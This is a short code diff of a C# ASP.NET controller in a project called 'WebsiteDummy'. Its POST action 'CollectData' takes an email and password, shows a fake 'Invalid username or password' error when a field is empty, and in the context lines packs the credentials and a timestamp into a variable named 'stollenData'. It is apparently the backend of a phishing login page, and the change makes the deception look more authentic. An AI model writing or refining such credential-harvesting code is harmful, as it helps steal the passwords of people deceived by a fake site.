@@ -24,7 +24,14 @@ namespace WebsiteDummy.Controllers
 		[HttpPost]
 		public ActionResult CollectData(string email, string password)
 		{
-		
+
+			if (email == string.Empty || password == string.Empty)
+			{
+
+				ViewBag.error = "Invalid username or password";
+				return View("Index");
+			}
+					
 
 			string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();
 
